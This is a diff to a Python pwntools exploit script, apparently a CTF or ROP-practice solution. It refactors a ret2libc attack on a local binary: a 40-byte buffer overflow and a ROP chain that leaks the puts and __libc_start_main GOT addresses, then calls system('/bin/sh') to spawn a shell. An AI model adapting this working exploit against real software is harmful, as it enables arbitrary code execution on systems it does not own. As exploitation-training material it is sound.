@@ -161,36 +161,45 @@ elf = ELF(process_name)
 rop = ROP(elf)
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
-offset = b'A'*40
-pop_rdi = 0x004009a3  # pop rdi; ret gadget
-puts_got = 0x00601018 # puts@got
-puts_plt = 0x004006d0 # puts@plt
-#leave = 0x004008f0    # leave; ret gadget
-ret = 0x004008f1      # ret gadget
-main = 0x00400847     # main procedure
+OFFSET = b'A'*40
+PUTS_PLT = elf.plt['puts']                         # so that we can call the puts function
+MAIN = elf.sym['main']                             # so that we can call main again, after leaking an address
+POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+RET = (rop.find_gadget(['ret']))[0]                # additional ret instruction for padding, to realign stack
 
 #p = process(process_name)
 p = gdb.debug(process_name, '''
+set disable-randomization off
+b pwnme
 b *pwnme+89
 ''')
 
-payload = offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
-print(p.recvuntil("> "))
-print(p.clean())
-p.sendline(payload)
-leaked_string = p.recvuntil("\ncallme")
-received = leaked_string.replace(b"Thank you!\n", b"")
-received = received.replace(b"\ncallme", b"")
-leaked_addr = u64(received.ljust(8, b"\x00"))
-libc.address = leaked_addr - libc.symbols["puts"]
-print("libc base @ %s" % hex(libc.address))
+def find_addr(func_name):
+    func_got = elf.got[func_name]
+    # overflow stack, print out function's address, restart at main
+    payload = OFFSET + p64(POP_RDI) + p64(func_got) + p64(PUTS_PLT) + p64(MAIN)
+    print(p.recvuntil("> "))
+    print(p.clean())
+    p.sendline(payload)
+    leaked_string = p.recvuntil("\ncallme")
+    received = leaked_string.replace(b"Thank you!\n", b"")
+    received = received.replace(b"\ncallme", b"")
+    leaked_addr = u64(received.ljust(8, b"\x00"))
+    print("--- leak BEGIN ---")
+    print(hex(leaked_addr))
+    print("--- leak END ---")
+    if libc.address == 0:
+        libc.address = leaked_addr - libc.symbols[func_name]
+        print("libc base @ %s" % hex(libc.address))
 
-bin_sh = next(libc.search(b"/bin/sh"))
-system = libc.sym["system"]
+find_addr('puts')
+find_addr('__libc_start_main')
 
 # do_system uses the movaps instruction, which will fail on an unaligned stack.
 # To realign the stack we include an additional ret in our rop-chain.
-payload = offset + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
+BIN_SH = next(libc.search(b"/bin/sh"))
+SYSTEM = libc.sym["system"]
+payload = OFFSET + p64(POP_RDI) + p64(BIN_SH) + p64(RET) + p64(SYSTEM)
 
 print(p.clean())
 p.sendline(payload)
